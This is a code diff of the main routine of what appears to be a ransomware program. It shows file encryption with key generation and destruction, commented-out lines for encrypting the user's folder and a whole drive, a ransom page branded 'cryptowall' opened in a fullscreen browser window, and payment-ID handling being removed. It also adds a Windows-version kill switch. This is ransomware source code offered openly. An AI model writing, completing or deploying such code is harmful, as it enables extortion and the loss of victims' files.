@@ -7,15 +7,59 @@
 #include <Lmcons.h>
 #include <windows.h>
 
-#include "drm.h"
 #include "base64.h" // User ID
 #include "factory.h"
+
+enum WinVer { Win10, Win8_1, Win8, Win7, WinVista, WinXP64, WinXP32, Win2000, Other, Error };
+
+WinVer WindowsVersion() {
+  system("ver > version");
+  FILE* ver = fopen("version", "rb");
+  if (ver == nullptr) return Error;
+  fseek(ver, 0, SEEK_END);
+  long size = ftell(ver);
+  rewind(ver);
+  char* buffer = new char[size];
+  fread(buffer, 1, size, ver);
+  char digits[] = "1234567890";
+  int pos = strcspn(buffer, digits);
+  int major = int(atof(&buffer[pos]) * 10) / 10;
+  int minor = int(atof(&buffer[pos]) * 10) % 10;
+  fclose(ver);
+  delete[] buffer;
+  remove("version");
+
+  switch (major) {
+    case 10:
+      return Win10;
+    case 6:
+      switch (minor) {
+        case 3: return Win8_1;
+        case 2: return Win8;
+        case 1: return Win7;
+        case 0: return WinVista;
+      }
+    break;
+    case 5:
+      switch (minor) {
+        case 2: return WinXP64;
+        case 1: return WinXP32;
+        case 0: return Win2000;
+      }
+    break;
+  }
+  return Other;
+}
+
+bool KillSwitch() {
+  return WindowsVersion() != Win10;
+}
 
 int main(int argc, char* argv[]) {
   Factory* factory = new Factory();
   IController* encrypter = factory->getIController();
 
-  if (argc > 0) {
+  if (argc > 1) {
     printf("\n");
     uint8_t key[32];
     char digit1, digit2;
@@ -45,20 +89,17 @@ int main(int argc, char* argv[]) {
     if (opt == 'Y' || opt == 'y')
       encrypter->decrypt("testfolder", key);
     printf("%u files has been decrypted\n", encrypter->getCantDecrypted());
-    return 1;
+    return 0;
   }
 
   /// HIDE CONSOLE
-#ifdef _WIN32
   //FreeConsole();
-#endif
+
   // Warning!!! This is all the security you will get.
   // Remove the line below under your own risk
   //if (KillSwitch()) exit(EXIT_FAILURE);
 
-  /// GENERATE KEY
-  char* id; unsigned int len;
-  encrypter->generateKey(id, len);
+  encrypter->generateKey();
 
   /// ENCRYPT FILES
   DWORD length = UNLEN + 1;
@@ -69,10 +110,9 @@ int main(int argc, char* argv[]) {
 
   /// Encrypt Files in those folders and subfolders:
   // Encrypt user folder
-  //SearchFiles(path, key);
   //encrypter->encrypt(path);
-  // Encrypt example folder (use always two backslashes)
   encrypter->encrypt("testfolder");
+  // Encrypt example folder (use always two backslashes)
   //encrypter->encrypt(D:\\);
 
   encrypter->destroyKey();
@@ -123,16 +163,6 @@ int main(int argc, char* argv[]) {
   system("start /b cmd /c \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -new-window cryptowall\\index.htm");
   system("fullscreen.vbs");
 
-  // include this to the .txt
-  printf("\nAfter payment, use the next id to generate your key: ");
-  PrintBase64(id, len);
-  printf("You can also use it to decrypt one file for free!\n");
-
-  /// SAVE ID TO FILE
-  FILE* idfile = fopen("ID.txt", "wb");
-  fwrite(id, sizeof(uint8_t), len, idfile);
-  fclose(idfile);
-  delete[] id;
   delete factory;
   return 0;
 }
